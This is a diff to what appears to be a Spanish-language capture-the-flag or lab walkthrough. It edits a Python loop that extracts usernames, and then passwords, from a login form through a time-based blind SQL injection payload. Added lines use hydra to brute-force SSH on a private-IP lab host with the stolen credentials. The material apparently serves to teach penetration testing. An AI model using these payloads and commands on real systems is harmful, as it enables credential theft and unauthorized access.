@@ -89,7 +89,8 @@ Privilege Escalation Perl Capabilities
             for i in range(1,20):
                 for c in caracteres:
                     dt = {
-                    "username": f"asdad' or if(substr((select group_concat(username,0x3a,password) from Users),{i},1)='{c}',sleep(3),1)-- -",
+                    "username": f"asdad' or if(substr((select group_concat(username) from Users),{i},1)='{c}',sleep(3),1)-- -",
+                     #una ves allas enumerado los usuarios puedes enumerar las contraseñas cambiando en el group_concat(password) eleji de esta manera lla que sino da problemas
                     "password":'1234568',
                     "submit" : 'Submit'
                     }
@@ -113,3 +114,5 @@ Privilege Escalation Perl Capabilities
             print('[-] error: %s' % e)
     
       
+una ves tengamos los usuarios y contraseñas crearemos un archivo llamado user.txt y uno password.txt 
+con las credenciales obtenidas Usaremos hydra para hacer un ataque de fuerza bruta: hydra -t 64 -L users.txt -P password.txt 192.168.1.102 ssh://192.168.1.102:22
